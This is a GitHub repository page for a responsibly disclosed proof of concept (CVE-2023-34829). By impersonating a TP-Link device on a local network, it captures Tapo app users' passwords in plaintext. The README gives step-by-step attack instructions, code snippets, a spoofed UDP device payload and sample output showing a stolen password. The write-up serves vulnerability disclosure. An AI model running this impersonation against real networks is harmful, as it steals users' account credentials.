=== Content from github.com_0f237494_20250115_085927.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSecureScripts%2FTP-Link_Tapo_Hack)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSecureScripts%2FTP-Link_Tapo_Hack)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=SecureScripts%2FTP-Link_Tapo_Hack)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[SecureScripts](/SecureScripts)
/
**[TP-Link\_Tapo\_Hack](/SecureScripts/TP-Link_Tapo_Hack)**
Public

* [Notifications](/login?return_to=%2FSecureScripts%2FTP-Link_Tapo_Hack) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FSecureScripts%2FTP-Link_Tapo_Hack)
* [Star
   8](/login?return_to=%2FSecureScripts%2FTP-Link_Tapo_Hack)

Deceiving the Tapo app by impersonating a TP-Link device

[8
stars](/SecureScripts/TP-Link_Tapo_Hack/stargazers) [2
forks](/SecureScripts/TP-Link_Tapo_Hack/forks) [Branches](/SecureScripts/TP-Link_Tapo_Hack/branches) [Tags](/SecureScripts/TP-Link_Tapo_Hack/tags) [Activity](/SecureScripts/TP-Link_Tapo_Hack/activity)
 [Star](/login?return_to=%2FSecureScripts%2FTP-Link_Tapo_Hack)

 [Notifications](/login?return_to=%2FSecureScripts%2FTP-Link_Tapo_Hack) You must be signed in to change notification settings

* [Code](/SecureScripts/TP-Link_Tapo_Hack)
* [Issues
  0](/SecureScripts/TP-Link_Tapo_Hack/issues)
* [Pull requests
  0](/SecureScripts/TP-Link_Tapo_Hack/pulls)
* [Actions](/SecureScripts/TP-Link_Tapo_Hack/actions)
* [Projects
  0](/SecureScripts/TP-Link_Tapo_Hack/projects)
* [Security](/SecureScripts/TP-Link_Tapo_Hack/security)
* [Insights](/SecureScripts/TP-Link_Tapo_Hack/pulse)

Additional navigation options

* [Code](/SecureScripts/TP-Link_Tapo_Hack)
* [Issues](/SecureScripts/TP-Link_Tapo_Hack/issues)
* [Pull requests](/SecureScripts/TP-Link_Tapo_Hack/pulls)
* [Actions](/SecureScripts/TP-Link_Tapo_Hack/actions)
* [Projects](/SecureScripts/TP-Link_Tapo_Hack/projects)
* [Security](/SecureScripts/TP-Link_Tapo_Hack/security)
* [Insights](/SecureScripts/TP-Link_Tapo_Hack/pulse)

# SecureScripts/TP-Link\_Tapo\_Hack

    main[Branches](/SecureScripts/TP-Link_Tapo_Hack/branches)[Tags](/SecureScripts/TP-Link_Tapo_Hack/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[33 Commits](/SecureScripts/TP-Link_Tapo_Hack/commits/main/) | | |
| [HTTPHandshakeImpersonation.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/HTTPHandshakeImpersonation.py "HTTPHandshakeImpersonation.py") | | [HTTPHandshakeImpersonation.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/HTTPHandshakeImpersonation.py "HTTPHandshakeImpersonation.py") |  |  |
| [OWNERFromDevice.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/OWNERFromDevice.py "OWNERFromDevice.py") | | [OWNERFromDevice.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/OWNERFromDevice.py "OWNERFromDevice.py") |  |  |
| [OWNERFromMD5.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/OWNERFromMD5.py "OWNERFromMD5.py") | | [OWNERFromMD5.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/OWNERFromMD5.py "OWNERFromMD5.py") |  |  |
| [README.md](/SecureScripts/TP-Link_Tapo_Hack/blob/main/README.md "README.md") | | [README.md](/SecureScripts/TP-Link_Tapo_Hack/blob/main/README.md "README.md") |  |  |
| [UDPImpersonation.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/UDPImpersonation.py "UDPImpersonation.py") | | [UDPImpersonation.py](/SecureScripts/TP-Link_Tapo_Hack/blob/main/UDPImpersonation.py "UDPImpersonation.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# TP-Link\_Tapo\_Hack

Deceiving the Tapo app by impersonating a TP-Link device.

# CVE-ID

CVE-2023-34829

# Authors

Vincenzo De Angelis (vincenzo.deangelis@unical.it), assistant professor at the University of Calabria & Sara Lazzaro (sara.lazzaro@unirc.it), researcher at the University of Reggio Calabria.

# Objective

Bypassing the authentication mechanism of the TP-Link Tapo app to obtain the victim’s password of their Tapo App in plaintext.

## Conditions of the attack

1. The attacker is in the same network of the Tapo app (reachable through UDP broadcast)
2. and one of the following two:

   2a. The attacker knows the username (email address) of the victim in the Tapo app OR

   2b. A TP-Link device is present in the network of the attacker and the Tapo app

## APP version

Tapo Version 3.1.315

## Overview of the authentication mechanism of the Tapo App

The Tapo app uses the following discovery and authentication mechanism (with some devices). First, the app broadcast (255.255.255.255) in UDP a discovery message. A TP-Link device connected to the network responds to the application by providing some information including its IP address. The app starts a handshake mechanism by contacting the device through HTTP and providing its public key. The device answers by encrypting a symmetric key with such a public key. The app provides the credentials (username and password) encrypted with the symmetric key.

## Overview of the attack

The attacker simulates a TP-Link device and when receives the HTTP handshake, it encrypts its own symmetric key. Then, it receives the encrypted credentials and can decrypt them.

## Detailed steps of the attack

#### Step 1-OWNER parameter discover

The first step consists in finding the OWNER parameter used by the Tapo App before starting the HTTP handshake.
If the attacker knows the email address of the victim in the Tapo App (Condition 2a), the OWNER parameter is simply the MD5 digest of this email address and can be computed in Python as follows (OWNERFromMD5.py):

```
import hashlib
TapoEmailVictim=b"EMAIL_ADDRESS_VICTIM"
OWNER = hashlib.md5(TapoEmailVictim).hexdigest().upper()
print(OWNER)
```

In the case the attacker does not know the email of the victim (Condition 2b), the OWNER parameter can be discovered by leveraging the TP-Link devices connected to the network. Indeed, they include this parameter in the plaintext answer to the broadcast request of the Tapo App.
Then, the attack consists in simulating the UDP broadcast request of the Tapo-App to obtain the OWNER parameter from a TP-Link device.
To do this use the Script OWNERFromDevice.py by inserting the IP address of the attacker.

```
attackerIP = "IP_ADDRESS_ATTACKER"
attackerPort = 53353
bufferSize = 2048
```

We tested it in a network in which the TP-Link Tapo Smart Plug P110 was connected.
This is the result:

```
stolen owner = 65C008A8F038F16A57E63F41EA51CC5B
```

#### Step 2-Deceiving the Tapo app by impersonating a TP-Link device.

The second step consists in deceiving the Tapo app by simulating the presence of a TP-Link device in the network. Specifically, this is performed by the attacker by answering the UDP broadcast request of the Tapo App thus simulating the behavior of an honest device.
To do this, lunch the script UDPImpersonation.py by specifying the IP address of the attacker and the OWNER parameter retrieved from Step 1.

```
attackerIP = "IP_ADDRESS_ATTACKER"
OWNER="OWNER_FROM_STEP_1"
localPort = 20002
bufferSize = 1024
```

In this script, we simulated the response of a TP-Link Tapo Smart Plug P110 (but it works without the presence of any device in the network).
The UDP response includes the following JSON:

```
udpJSONPayload={"result":{"device_id":"6447b7fc4902ab3a83f973a2767a38aa","owner":OWNER,"device_type":"SMART.TAPOPLUG","device_model":"P110(EU)","ip":attackerIP,"mac":"30-DE-4B-45-12-60","is_support_iot_cloud":False,"obd_src":"tplink","factory_default":False,"mgt_encrypt_schm":{"is_support_https":False,"encrypt_type":"AES","http_port":80,"lv":1}},"error_code":0}

```

Observe that all the parameters are fixed except for the OWNER and ATTACKER IP parameters used by the Tapo app to perform a check and start the HTTP-based handshake with the attacker device. The other relevant parameter is “lv:1” so that the victim’s password of the Tapo App is received in cleartext in the next step.

#### Step 3-Bypass the HTTP handshake to obtain the password in plaintext.

After receiving the UDP response from the attacker (see Step 2), the Tapo app starts an HTTP handshake with the attacker. First, the Tapo app sends an HTTP request including its RSA public key. Then, the attacker encrypts a symmetric (AES) key with such an RSA key and sends the result in the HTTP response. The Tapo app decrypts the AES key using the RSA private key and uses the AES key to encrypt the victim’s credentials including the password in cleartext. This message is sent through a new HTTP request to the attacker. The attacker uses the AES key to decrypt the password.
To perform this step lunch HTTPHandshakeImpersonation.py by specifying the IP address of the attacker.

```
def run():
     attackerIP ="ATTACKER_IP_ADDRESS"
     server_address = (attackerIP, 80)
     httpd = HTTPServer(server_address, RequestHandlerHTTP)
     httpd.serve_forever()
```

The final result, reporting the victim’s password, is shown below:

```
10.0.0.113 - - [22/May/2023 10:26:16] "POST /app HTTP/1.1" 200 -
stolenpassword=Vincenzo&Sara

```

## Summary of the attack

1. Lunch either OWNERFromMD5.py or OWNERFromDevice.py to obtain the OWNER parameter.
2. Lunch HTTPHandshakeImpersonation.py and UDPImpersonation.py (lunch a HTTP and UDP server simultaneously)
3. Wait for the user to open the home of the Tapo App and obtain the password in the console of HTTPHandshakeImpersonation.py .

   A proof of the attack is available at the following video

   [![Anteprima del mio video](https://camo.githubusercontent.com/7cf698ab0d45fff7690186d8ca02f8096e0e45798b03899d322f2141d59f4dc8/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f52564779745164756171772f302e6a7067)](https://www.youtube.com/watch?v=RVGytQduaqw)

## Observations

This attack is not a vulnerability of a specific device (it can be conducted even in the case no device is present in the network) but it concerns the authentication protocol the Tapo App uses. To solve the problem, we suggest removing the use of local traffic and relying on the cloud through TLS messages.

## Responsible Disclosure

We have responsibly disclosed the issue to the TP-Link company. They acknowledged it and confirmed that the Tapo app is now fixed.

## About

Deceiving the Tapo app by impersonating a TP-Link device

### Resources

[Readme](#readme-ov-file)

[Activity](/SecureScripts/TP-Link_Tapo_Hack/activity)
### Stars

[**8**
stars](/SecureScripts/TP-Link_Tapo_Hack/stargazers)
### Watchers

[**1**
watching](/SecureScripts/TP-Link_Tapo_Hack/watchers)
### Forks

[**2**
forks](/SecureScripts/TP-Link_Tapo_Hack/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FSecureScripts%2FTP-Link_Tapo_Hack&report=SecureScripts+%28user%29)

## [Releases](/SecureScripts/TP-Link_Tapo_Hack/releases)

No releases published

## [Packages 0](/users/SecureScripts/packages?repo_name=TP-Link_Tapo_Hack)

No packages published

## Languages

* [Python
  100.0%](/SecureScripts/TP-Link_Tapo_Hack/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


